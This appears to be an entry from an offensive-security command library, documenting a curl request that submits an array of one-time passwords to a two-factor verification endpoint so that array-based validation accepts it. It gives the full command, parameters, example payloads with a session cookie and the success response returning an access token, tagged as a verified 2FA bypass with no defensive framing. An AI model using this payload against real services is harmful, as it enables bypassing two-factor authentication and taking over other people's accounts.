---
type: command
executor: bash
data: >-
  curl -X POST -H "Content-Type: application/json" -H "Cookie:
  session=$_SESSION_TOKEN" -d @otp_payload.json $_VERIFY_URL
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - 2fa
  - bypass
  - http
verified: true
validated: true
---

# curl-post-otp-array-verification

## Command

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: session=$_SESSION_TOKEN" -d @otp_payload.json $_VERIFY_URL
```

## Description

This command sends a POST request to a 2FA verification endpoint with a JSON payload containing an array of OTPs, exploiting array-based validation to bypass authentication if a valid OTP is included.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SESSION_TOKEN | Session cookie from initial login attempt | Yes |
| otp_payload.json | File containing the JSON OTP array payload | Yes |
| $_VERIFY_URL | URL of the 2FA verification endpoint (e.g., https://target.com/api/verify-otp) | Yes |
| -X POST | Specifies HTTP POST method | Built-in |
| -H "Content-Type: application/json" | Sets JSON content type header | Built-in |
| -H "Cookie: session=$_SESSION_TOKEN" | Includes session for stateful request | Built-in |
| -d @otp_payload.json | Reads payload from file | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: session=abc123" -d '{"otp":["1234","1337"] }' https://example.com/verify-otp
```

### Advanced Usage

With verbose output for debugging:

```bash
curl -v -X POST -H "Content-Type: application/json" -H "Cookie: session=abc123" -d @otp_payload.json https://example.com/verify-otp
```

## Expected Output

Successful response:

```json
{
  "status": "success",
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

Failure (no valid OTP):

```json
{
  "status": "error",
  "message": "Invalid OTP"
}
```

## Related

- [[procedures/Bypass-2FA-with-OTP-Array]]
- [[codes/JSON-OTP-Array-Payload]]
